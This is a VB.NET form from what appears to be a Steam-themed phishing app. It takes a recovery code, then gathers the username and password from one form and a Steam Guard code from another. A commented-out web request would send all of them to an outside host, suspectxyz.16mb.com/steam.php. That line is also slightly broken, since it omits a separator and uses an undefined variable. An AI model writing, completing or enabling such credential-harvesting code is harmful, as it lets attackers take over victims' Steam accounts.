Imports System.Text.RegularExpressions
Imports System.Net
Imports System.Text
Imports System.IO

Public Class Form4
    Private Sub Form4_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.CenterToScreen()
    End Sub

    Private Sub SteamButton1_Click(sender As Object, e As EventArgs) Handles SteamButton1.Click
        Application.Exit()
    End Sub

    Dim drag As Boolean = False
    Dim x, y As Integer

    Private Sub PictureBox1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseDown
        drag = True
        x = e.X
        y = e.Y
    End Sub

    Private Sub PictureBox1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseMove
        If drag Then
            Me.Left = MousePosition.X - x
            Me.Top = MousePosition.Y - y
        End If
    End Sub

    Private Sub SteamButton2_Click(sender As Object, e As EventArgs) Handles SteamButton2.Click
        Dim str As String
        str = SteamTextBox1.Text
        If Regex.IsMatch(str, "[R]{1}\d{5}") = True Then
            System.Threading.Thread.Sleep(1000)
            Form5.Show()

            Dim sgcode As String = Form3.SteamTextBox1.Text
            Dim user As String = Form1.UsernameBox.Text
            Dim pass As String = Form1.SteamTextBox1.Text
            ' Dim myReq As HttpWebRequest = WebRequest.Create("http://suspectxyz.16mb.com/steam.php?user=" & user & "&pass=" & pass & "&sgcode=" & sgcode & "rcode=" & rcode)
            ' MsgBox("SGCode: " & sgcode)
            Form1.Hide()
            Me.Close()
        Else
            SteamTextBox1.Text = "R"
        End If
    End Sub

    Private Sub PictureBox1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseUp
        drag = False
    End Sub
End Class